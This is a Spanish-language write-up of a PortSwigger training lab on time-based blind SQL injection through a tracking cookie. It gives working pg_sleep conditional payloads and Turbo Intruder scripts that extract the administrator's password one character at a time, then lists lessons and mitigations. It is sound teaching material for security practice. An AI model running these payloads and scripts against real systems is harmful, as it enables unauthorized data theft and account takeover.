---
title: "Inyección SQL ciega con retrasos temporales y recuperación de información"
platform: "PortSwigger"
os: "Windows"
difficulty: "Hard"
ip: "10.10.10.XXX"
slug: "inyeccion-sql-ciega-con-retrasos-temporales-y-recuperacion-de-informacion"
author: "Z4k7"
date: "2026-03-15"
year: "2026"
status: "pwned"
tags:
  - "SQLi"
  - "BlindInjection"
  - "TimeBased"
  - "CookieTracking"
techniques:
  - "SQLi"
  - "BlindInjection"
  - "TimeBased"
  - "CookieTracking"
tools:
  - "Burpsuite"
  - "Turbo-Intruder"
  - "Python"
flags_list:
  - label: "usuario"
    value: "administrator"
  - label: "password"
    value: "y1qu9zyl9ua4bn4gjxf4"
summary: "La inyección SQL ciega basada en tiempo ocurre cuando una aplicación no devuelve resultados visibles ni errores, pero ejecuta consultas de forma síncrona. El atacante introduce retardos condicionales (pg_sleep) para inferir información de la base de datos.   Esta vulnerabilidad existe porque la aplicación concatena valores no validados (cookie de tracking) directamente en la consulta SQL."
steps:

  - id: "exploit"
    num: "01"
    title: "Objetivo"
    content:
      - kind: "note"
        text: |
          Este laboratorio contiene una vulnerabilidad de inyección SQL ciega. La aplicación utiliza una cookie de seguimiento para análisis y ejecuta una consulta SQL que contiene el valor de la cookie enviada.
          Los resultados de la consulta SQL no se devuelven y la aplicación no reacciona de forma diferente según si la consulta devuelve alguna fila o genera un error. Sin embargo, dado que la consulta se ejecuta de forma síncrona, es posible activar retardos condicionales para obtener información.
          La base de datos contiene una tabla diferente llamada `users`, con columnas llamadas `username` y `password`. Necesitas explotar la vulnerabilidad de inyección SQL ciega para averiguar la contraseña de la `administrator`usuario.
          Para resolver el laboratorio, inicie sesión como el `administrator`usuario.

  - id: "recon"
    num: "02"
    title: "Reconocimiento"
    content:
      - kind: "note"
        text: |
          En el apartado de la web contamos con una cookie en la cual podríamos aplicar una inyección para tratar de obtener información de la misma
      - kind: "image"
        src: "assets/images/Inyección%20SQL%20ciega%20con%20retardos%20de%20tiempo/file-20260314184841648.jpg"
        caption: "Evidencia técnica"
      - kind: "callout"
        type: "info"
        label: "Evidencia Técnica"
        text: "La aplicación no muestra errores ni diferencias en el estado HTTP, confirmando que se trata de una inyección SQL ciega."

  - id: "exploit"
    num: "03"
    title: "Explotación"
    content:
      - kind: "note"
        text: |
          Validamos una concatenación para tratar de obtener un retazo de tiempo en este caso aplicando  `||` contamos con el respectivo retazo de tiempo.
          Enviamos una solicitud normal y validamos el tiempo de respuesta
      - kind: "image"
        src: "assets/images/Inyección%20SQL%20ciega%20con%20retrasos%20temporales%20y%20recuperación%20de%20información/file-20260314193159490.jpg"
        caption: "Evidencia técnica"
      - kind: "code"
        lang: "SQL"
        code: |
          TrackingId=g5bZmnol84zYOK0g'||pg_sleep(10)--;
      - kind: "image"
        src: "assets/images/Inyección%20SQL%20ciega%20con%20retrasos%20temporales%20y%20recuperación%20de%20información/file-20260314193324337.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Tratemos en enviar una validación lógica boolean
          Si enviamos una validación en TRUE  = tiempo de respuesta  10,215 s
      - kind: "image"
        src: "assets/images/Inyección%20SQL%20ciega%20con%20retrasos%20temporales%20y%20recuperación%20de%20información/file-20260314193502566.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Si enviamos una validación en FALSE  = tiempo de respuesta  233s
      - kind: "image"
        src: "assets/images/Inyección%20SQL%20ciega%20con%20retrasos%20temporales%20y%20recuperación%20de%20información/file-20260314193615488.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Tomamos la validación y confirmamos si contamos con el usuario administrador en la BD en la tabla de nombre `users`
      - kind: "code"
        lang: "SQL"
        code: |
          TrackingId=g5bZmnol84zYOK0g'||(SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users WHERE username='administrator')--
      - kind: "image"
        src: "assets/images/Inyección%20SQL%20ciega%20con%20retrasos%20temporales%20y%20recuperación%20de%20información/file-20260314194310938.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Vara confirmas que real mente se  esta cumpliendo la condición vamos a tratar de alterar el `username` por otro
      - kind: "image"
        src: "assets/images/Inyección%20SQL%20ciega%20con%20retrasos%20temporales%20y%20recuperación%20de%20información/file-20260314194434411.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Una vez se confirma  que si contamos con el usuario  vamos a tratar de obtener la logitud del password
          Enviamos el proceso por medio e intruder para obtener la logitud
      - kind: "code"
        lang: "SQL"
        code: |
          Cookie: TrackingId=g5bZmnol84zYOK0g'||(SELECT CASE WHEN LENGTH(password)> THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users WHERE username='administrator')--; session=R3fFRoiVTvvjs1yJxZqdB5KKItHg6ICJ
          Cache-Control: max-age=0
      - kind: "image"
        src: "assets/images/Inyección%20SQL%20ciega%20con%20retrasos%20temporales%20y%20recuperación%20de%20información/file-20260314195129031.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Vamos a tratar  el mismo proceso pero por medio de turbo intrude
      - kind: "code"
        lang: "PYTHON"
        code: |
          def queueRequests(target, wordlists):
              engine = RequestEngine(endpoint=target.endpoint,
                                     concurrentConnections=5,
                                     requestsPerConnection=100,
                                     pipeline=False
                                     )
          
              for word in open('C:\\Users\\Public\\numbers.txt'):
                  engine.queue(target.req, word.rstrip())
          
          
          def handleResponse(req, interesting):
              # currently available attributes are req.status, req.wordcount, req.length and req.response
              if req.status != 404:
                  table.add(req)
      - kind: "note"
        text: |
          Contamos con la misma enumeraron de la longitud del password
      - kind: "image"
        src: "assets/images/Inyección%20SQL%20ciega%20con%20retrasos%20temporales%20y%20recuperación%20de%20información/file-20260314200528787.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Aplicamos validar el password en este caso no utilizamos  el apartado de intrude ya que suele demorar mas de no normal por que no somos cuenta profe intentamos tomar la captura por medio  del script en turbo intrude
      - kind: "code"
        lang: "SQL"
        code: |
          Cookie: TrackingId=g5bZmnol84zYOK0g'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users WHERE username='administrator')--;
      - kind: "code"
        lang: "PYTHON"
        code: |
          def queueRequests(target, wordlists):
              engine = RequestEngine(endpoint=target.endpoint,
                                     concurrentConnections=2,
                                     requestsPerConnection=20,
                                     pipeline=False)
          
              for numero in range(1, 25):
                  
                  # 2. Por cada número, abrimos y recorremos el diccionario abc.txt
                  # Es importante abrirlo dentro para que el puntero se reinicie
                  with open('C:\\Users\\Public\\abc.txt') as f:
                      for word in f:
                          word = word.rstrip()
                          
                          # 3. Enviamos ambos valores como una lista
                          # Tu solicitud (target.req) DEBE tener dos marcadores %s
                          engine.queue(target.req, [str(numero), word])
          
          def handleResponse(req, interesting):
              if req.status != 404:
                  table.add(req)
      - kind: "note"
        text: |
          Podemos capturar el password del usuario
      - kind: "image"
        src: "assets/images/Inyección%20SQL%20ciega%20con%20retrasos%20temporales%20y%20recuperación%20de%20información/file-20260314231457196.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Script optimizado para reconstrucción dinámica:
      - kind: "code"
        lang: "PYTHON"
        code: |
          found = {}
          def queueRequests(target, wordlists):
              engine = RequestEngine(endpoint=target.endpoint,
                                     concurrentConnections=2,
                                     requestsPerConnection=50,
                                     pipeline=False)
          
              for numero in range(1, 25):
                  
                  # 2. Por cada número, abrimos y recorremos el diccionario abc.txt
                  # Es importante abrirlo dentro para que el puntero se reinicie
                  with open('C:\\Users\\Public\\abc.txt') as f:
                      for word in f:
                          word = word.rstrip()
                          
                          # 3. Enviamos ambos valores como una lista
                          # Tu solicitud (target.req) DEBE tener dos marcadores %s
                          engine.queue(target.req, [str(numero), word])
          
          def handleResponse(req, interesting):
              global found
              if req.time < 10014:
                  numero = str(req.words[0])
                  letra = str(req.words[1])
                  found[numero] = letra
                  palabra = ''.join(found[i] for i in sorted(found.keys(), key=int))
                  
                  req.label = 'ok - '+ palabra
                  table.add(req)
              elif req.status != 404:
                  table.add(req)
      - kind: "image"
        src: "assets/images/Inyección%20SQL%20ciega%20con%20retrasos%20temporales%20y%20recuperación%20de%20información/file-20260314235044197.jpg"
        caption: "Evidencia técnica"

  - id: "flag_01"
    type: "flag"
    flag_items:
      - label: "usuario"
        value: "administrator"
      - label: "password"
        value: "y1qu9zyl9ua4bn4gjxf4"

lessons:
  - 'Este laboratorio demuestra cómo una aplicación aparentemente segura puede ser explotada mediante tiempo de respuesta.'
  - 'En auditorías, siempre probar inyecciones ciegas cuando no hay mensajes de error visibles.'
  - 'Para exámenes y entrevistas, recordar que SQLi ciega se divide en:'
  - 'Boolean-based'
  - 'Time-based'
  - 'Error-based'
  - 'La automatización con Turbo Intruder es clave para escenarios de extracción lenta'
mitigation:
  - 'Implementar consultas parametrizadas (Prepared Statements).'
  - 'Validar y sanitizar cookies antes de usarlas en SQL.'
  - 'Configurar WAF para detectar patrones de `pg_sleep`.'
  - 'Monitorear tiempos de respuesta anómalos.'
  - 'Aplicar principio de mínimo privilegio en cuentas de BD.'
---
